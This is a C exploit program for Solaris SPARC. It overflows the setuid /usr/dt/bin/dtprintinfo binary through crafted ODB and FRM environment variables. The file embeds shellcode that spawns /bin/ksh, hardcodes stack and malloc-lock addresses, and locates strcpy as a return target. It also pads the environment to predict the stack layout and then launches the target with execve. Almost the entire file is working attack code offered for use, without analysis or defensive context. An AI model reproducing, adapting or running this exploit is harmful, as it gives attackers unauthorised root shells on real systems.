#include <stdio.h>
#include <string.h>
#include <sys/systeminfo.h>
#include <dlfcn.h>

#define ENVBUF 5008
#define FRM 4000
#define NOPS 200

/* lsd shellcode. */
char shellcode[]=
    "\x90\x08\x3f\xff"     /* and     %g0,-1,%o0           */
    "\x82\x10\x20\x17"     /* mov     0x17,%g1             */
    "\x91\xd0\x20\x08"     /* ta      8                    */
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode-4>        */
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode>          */
    "\x7f\xff\xff\xff"     /* call    <shellcode+4>        */
    "\x90\x03\xe0\x20"     /* add     %o7,32,%o0           */
    "\x92\x02\x20\x10"     /* add     %o0,16,%o1           */
    "\xc0\x22\x20\x08"     /* st      %g0,[%o0+8]          */
    "\xd0\x22\x20\x10"     /* st      %o0,[%o0+16]         */
    "\xc0\x22\x20\x14"     /* st      %g0,[%o0+20]         */
    "\x82\x10\x20\x0b"     /* mov     0xb,%g1              */
    "\x91\xd0\x20\x08"     /* ta      8                    */
    "/bin/ksh"
;

unsigned long
getlong(char * c)
{
 unsigned long bob;
 sscanf(c,"%lx",&bob);
 return bob;
}


int
check_for_bad_byte(unsigned long check, unsigned char badbyte)
{
  unsigned char bob;

 bob=(unsigned char)(check & 0xff);
  if (bob == badbyte)
    return 1;
  bob=(unsigned char)((check >> 8) & 0xff);
  if (bob == badbyte)
    return 1;
  bob=(unsigned char)((check >> 16) & 0xff);
  if (bob == badbyte)
    return 1;
  bob=(unsigned char)((check >> 24) & 0xff);
  if (bob == badbyte)
    return 1;

  return 0;

}

int
check_for_bad_bytes(unsigned long check)
{
  unsigned char badbytes[] = {0x00,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f};
  int i;

  for (i=0; i< sizeof(badbytes); i++)
   {
    if (check_for_bad_byte(check,badbytes[i]))
        return 1;

   }

  return 0;
}

unsigned long
get_good_place_to_return()
{
  void *handle;
  unsigned long dlfunction_addr;

  if (!(handle=dlopen(NULL,RTLD_LAZY)))
    {
      fprintf(stderr,"Can't dlopen myself!\n");
        exit(1);
    }

  if ((dlfunction_addr=(long)dlsym(handle,"strcpy"))==NULL)
    {
      fprintf(stderr,"Can't find %s().\n","strcpy");
      dlfunction_addr=0;
    }


   if (check_for_bad_bytes(dlfunction_addr))
        {
         /*we need to see if strcpy exists instead*/
         if ((dlfunction_addr=(long)dlsym(handle,"strccpy"))==NULL)
         {
           fprintf(stderr,"Can't find %s().\n","strccpy");
           dlfunction_addr=0;
         }
         if (check_for_bad_bytes(dlfunction_addr) )
           {
              printf("Couldn't locate strcpy or strccpy.\n");
              exit(1);
           }
        }
    return dlfunction_addr;


}

int
main(int argc,char **argv) {

char *argp[2];
char *envp[6];
char display[128];
char home[8];
char platform[256];
char buf[ENVBUF];
char frm[FRM];
int align, p;
int pad=31;
int subval;
char *pathenv;
unsigned int frmlength,frmplace;

long dlfunction_addr;

if(argc==3)
   align=atoi(argv[02]);
    
else
   align=-2;


if(argc<2 || argc>3) {
  printf("usage: %s xserver:display <alignment>\n",argv[0]);
  exit(-1);
 }

else {

dlfunction_addr=get_good_place_to_return();
printf("Using dlfunction_addr of 0x%8x\n",dlfunction_addr);

sprintf(display,"DISPLAY=%s",argv[1]);
memset(buf,0x41,sizeof(buf)); /*fill up so no nulls*/
memset(buf+2546,0x49,sizeof(buf)-2546);

memcpy(home,"HOME=.",strlen("HOME=."));
memset(buf,0x90,NOPS);
memcpy(buf,"ODB=",4);
memcpy((buf+NOPS)+align,shellcode,strlen(shellcode)); 
memset(frm,0x43,FRM);
memcpy(frm,"FRM=",4);

/* i0 __malloc_lock 0xfed37ee8 */
buf[2522]=0xfe;
buf[2523]=0xd3;
buf[2524]=0x7e;
buf[2525]=0xe8;

/* i1 shellcode 0xffbeec50 */
/*this points to inside our ODB variable*/
buf[2526]=0xff;
buf[2527]=0xbe;
buf[2528]=0xec;
buf[2529]=0x50;

/* fp, set to 0's.  0x90's are already in malloc lock now 0xffbe32b8 */
buf[2546]=0xff;
buf[2547]=0xbe;
buf[2548]=0x32;
buf[2549]=0xb8;

/* i7.  0xfed37ee8  malloc lock.*/
buf[2550]=0xfe;
buf[2551]=0xd3;
buf[2552]=0x7e;
buf[2553]=0xe8;


/* set the addr of strcpy that we found */
frm[509]=(dlfunction_addr >> 24)    & 0xff;
frm[510]=(dlfunction_addr >> 16)    & 0xff;
frm[511]=(dlfunction_addr >> 8) & 0xff;
frm[512]=(dlfunction_addr >> 0) & 0xff;


/* fp gets set again when i set i0 and i1
   send to some 43's aka FRM.
   0xffbef094  
*/
frm[505]=0xff;
frm[506]=0xbe;
frm[507]=0xf0;
frm[508]=0x94;


/* i0. first reg i touch in this file. send to __malloc_lock
   0xfed37ee8   
*/
frm[481]=0xfe;
frm[482]=0xd3;
frm[483]=0x7e;
frm[484]=0xe8;

frm[FRM-3]=0;

sysinfo(SI_PLATFORM,platform,256);
printf("Using platform of *%s*\n",platform);

buf[5000]=0;  

pathenv=(char *)strdup("PATH=.:/usr/bin");

envp[0]=frm; /* our stack frames that we use */
envp[1]=pathenv;
envp[2]=buf; /* shellcode */
envp[3]=home;
envp[4]=display;
envp[5]=0;

argp[0]=(char *) strdup("/usr/dt/bin/dtprintinfo");
argp[1]=0;

/*+4 at end for a null word on the end of the stack*/
/*basicaly we go through the arguments and environment and add the strlengths, then we add the strlen of the platform and 
  4 bytes for the null word at the end of the stack. This whole thing then is going to be word aligned by the OS, so 
  we then use that value %4 to get where FRM= is going to be located in memory.

  So now we know the EXACT location of FRM= on the stack, and we that it is exactly word aligned.

  To make this work, we need to control the length of one of these buffers such that FRM= is at exactly a location we have 
  already predicted.
*/

frmlength=strlen(frm)+1+strlen(pathenv)+1+strlen(buf)+1+strlen(home)+1+strlen(display)+1+strlen(platform)+1+strlen(argp[0])+1+4;
frmplace= (0xffbeffff-(frmlength) ) - ((0xffbeffff-(frmlength) ) % 4);
printf("strlen(env)=%d location of frm= is at 0x%4x\n",frmlength,frmplace);


/*
  now we want to make that number a WORD aligned number at 0xffbedc80. So we take frmplace and subtract from the length of buf
  to get 0xffbedc80.
*/

subval=0xffbedc80-frmplace;
buf[strlen(buf)-subval]=0; /*here we prematurely terminate buf to pad out frmplace to be what we want.*/
frmlength=strlen(frm)+1+strlen(pathenv)+1+strlen(buf)+1+strlen(home)+1+strlen(display)+1+strlen(platform)+1+strlen(argp[0])+1+4;
frmplace= (0xffbeffff-(frmlength) ) - ((0xffbeffff-(frmlength) ) % 4);
printf("strlen(env)=%d location of frm= is at 0x%4x\n",frmlength,frmplace);



printf("execve() started.\n");
fflush(0);
execve("/usr/dt/bin/dtprintinfo",argp,envp);
printf("execve() failed.\n");
} 
} 
